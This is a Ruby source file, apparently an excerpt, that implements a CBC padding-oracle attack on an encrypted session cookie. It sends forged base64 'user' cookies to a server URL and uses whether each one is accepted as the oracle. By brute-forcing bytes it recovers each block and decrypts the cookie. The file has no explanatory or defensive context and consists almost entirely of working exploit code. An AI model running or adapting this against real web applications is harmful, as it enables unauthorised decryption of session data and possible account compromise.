require 'base64'
require 'open-uri'


BLOCK_SIZE = 16
LAST_BYTE = BLOCK_SIZE-1

def debug(msg)
  $stderr.puts msg
end

module Oracle
  module_function

  def test_cookie(cookie)
    encoded = Base64.strict_encode64(cookie)
    #debug "Attempting cookie #{encoded}"
    begin
      open(URL, 'Cookie' => "user=\"#{encoded}\"")
      debug "Server accepts the cookie #{encoded}"
      true
    rescue OpenURI::HTTPError
      false
    end
  end

  def random_bytes(size)
    Array.new(size) { rand(0xff) }
  end

  def xor(a, b)
    [a.unpack('C*'), b.unpack('C*')].transpose.map { |x| x.reduce(:^) }.pack('C*')
  end

  def test_helper(byte_array, block)
    test_cookie(byte_array.pack('C*') + block)
  end

  def last_word(block)
    r = random_bytes(BLOCK_SIZE)
    decoded = Array.new

    # Find the last byte
    (0..0xff).to_a.shuffle.each do |x|
      r[-1] = x
      break if test_helper(r, block)
    end

    r[-1] ^= 1

    # Add to the decoded array as long as bytes are part of the padding
    begin
      decoded.unshift r.pop^1
      r[-1] ^= 1
    end until test_helper(r.concat(decoded), block)

    decoded[0] ^= decoded.length

    decoded
  end

  def decrypt_block(block)
    decoded = last_word(block)

    until decoded.length == BLOCK_SIZE

      debug "Decrypted: #{decoded}"

      r = random_bytes(BLOCK_SIZE - decoded.length).concat(decoded)

      (0..0xff).to_a.shuffle.each do |x|
        r[-decoded.length-1] = x
        break if test_helper(r, block)
      end

      decoded.unshift r[-decoded.length-1] ^ (decoded.length+1)
    end

    decoded.pack('C*')
  end

  def decrypt(blocks)
    decrypted = Array.new

    decrypted[0] = xor(IV, decrypt_block(blocks[0]))
    (1..blocks.size-1).each do |b|
      decrypted[b] = xor(blocks[b-1], decrypt_block(blocks[b]))
    end

    decrypted
  end
end